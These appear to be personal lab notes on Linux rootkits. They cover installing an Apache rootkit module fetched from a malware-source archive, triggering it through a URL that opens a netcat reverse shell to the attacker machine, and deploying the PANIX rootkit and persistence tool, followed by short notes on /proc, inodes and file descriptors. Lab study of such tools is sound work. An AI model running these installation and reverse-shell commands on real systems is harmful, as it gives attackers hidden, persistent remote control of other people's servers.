# Linux Rootkits

## Lab Notes: Exploring Linux Rootkits

### Installing and Using Apache-Rootkit

#### Ubuntu

```
sudo apt update && sudo apt install apache2 apache2-dev apache2-utils ncat
cd /tmp
wget -c https://github.com/vxunderground/MalwareSourceCode/blob/main/Linux/Rootkits/Rootkit.Linux.Apache-rootkit.7z
7z e Rootkit.Linux.Apache-rootkit.7z
sudo apxs -c -i mod_authg.c
sudo nano /etc/apache2/apache2.conf
# add in: 
    LoadModule authg_module /usr/lib/apache2/modules/mod_authg.so
    <Location /authg>
    SetHandler authg
    </Location>
sudo systemctl restart apache2
```

#### Kali

```
nc -nvlp 5555
# access server at http://10.0.5.6/authg?c=/bin/sh|%20ncat%20kali-ip-address%205555%20-e%20/bin/bash
```

### Installing and Using PANIX

```
curl -sL https://github.com/Aegrah/PANIX/panix.sh -o panix.sh
chmod +x panix.sh
sudo apt install linux-headers-6.11.2-amd64
sudo ./panix.sh --rootkit --secret "P4N1X" --identifier "panix"
```

### Additional Notes

* kill: sends signals to a process, not just kill it
* /proc: directory on a file system (that doesn't exist when the system is turned off) that has a directory for each process
  * /proc/net/tcp: file that shows all listening processes and their sockets
* inode: each file on a system can be identified by a unique ID (inode)
* within a process, there are IDs pointing to a resource (file, pipe, memory location, socket)- these are file descriptors in Linux or handles in Windows
  * /proc/\[PID]/fd/\*
  * contains the data streams (0 (stdin), 1 (stdout), 2 (stderr)
